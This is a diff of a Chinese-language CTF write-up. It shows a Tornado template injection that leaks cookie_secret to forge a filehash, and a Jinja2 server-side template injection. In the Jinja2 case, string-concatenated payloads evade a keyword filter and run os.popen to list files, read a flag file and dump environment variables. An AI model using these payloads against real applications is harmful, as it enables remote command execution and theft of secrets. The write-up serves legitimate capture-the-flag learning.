@@ -244,7 +244,7 @@ render是一个类似模板的东西，可以使用不同的参数来访问网�
 ```
 error?msg={{handler.settings}}
 ```
-![alt text](image-33.png)
+![alt text](image-33.png)<br>
 找到cookie_secret后可以开始构造filehash了
 ```python
 from hashlib import md5
@@ -258,4 +258,27 @@ print(md5_2)
 得到md5值d6d65970ada8db42620009e7db3ec8c3
 ![alt text](image-34.png)<br>
 ### 你的名字
-(未完成)
+![alt text](image-41.png)<br>
+很明显要从这里注入，测试{{}}发现报错，可能存在waf，用yakit进行一下fuzz测试
+![alt text](image-40.png)<br>
+可以从中看到屏蔽了一些关键词，例如图中的item，而且发现没有被屏蔽掉的{%print()%}的方式可以不用{{}}达成相同的效果<br>
+本应构造payload如下
+```
+{%print lipsum.__globals__['__builtins__']['__import__']('os')['popen']('ls /').read()%}
+```
+为了绕过关键词检测，把关键词用字符串拼接
+```
+{%print lipsum.__globals__['__bui'+'ltins__']['__im'+'port__']('o'+'s')['po'+'pen']('ls /').read()%}
+```
+![alt text](image-48.png)<br>
+看到flag_1s_Hera，cat出来看看
+```
+{%print lipsum.__globals__['__bui'+'ltins__']['__im'+'port__']('o'+'s')['po'+'pen']('cat /flag_1s_Hera').read()%}
+```
+![alt text](image-49.png)<br>
+让我们去环境变量里看看
+```
+{%print lipsum.__globals__['__bui'+'ltins__']['__im'+'port__']('o'+'s')['po'+'pen']('env').read()%}
+```
+![alt text](image-50.png)<br>
+找到flag<br>
